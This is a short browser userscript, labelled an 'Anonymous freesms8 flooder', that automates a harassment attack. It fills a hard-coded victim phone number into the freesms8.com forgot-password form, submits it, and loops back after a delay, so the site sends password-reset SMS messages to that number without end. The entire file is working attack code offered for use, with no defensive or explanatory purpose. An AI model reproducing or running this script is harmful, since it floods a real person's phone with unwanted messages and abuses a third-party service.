// ==UserScript==
// @name          Anonymous freesms8 flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*freesms8.com/*
// @credits       One
// ==/UserScript==

var victim=8092262928 //
var delay=1000; // Enter delay in milliseconds if required

if(document.location=="http://www.freesms8.com/forgotpassword.aspx"||document.location=="http://www.freesms8.com/forgotpassword.aspx")
{
document.getElementById('ctl00_BodyPlaceHolder_UserName').value=victim;
document.getElementById('ctl00_BodyPlaceHolder_SendMe').click();
}
if(document.location=="http://www.freesms8.com/Forgot-Password-Sent.aspx"||document.location=="http://www.freesms8.com/Forgot-Password-Sent.aspx")
setTimeout("document.location='http://www.freesms8.com/forgotpassword.aspx'",delay);
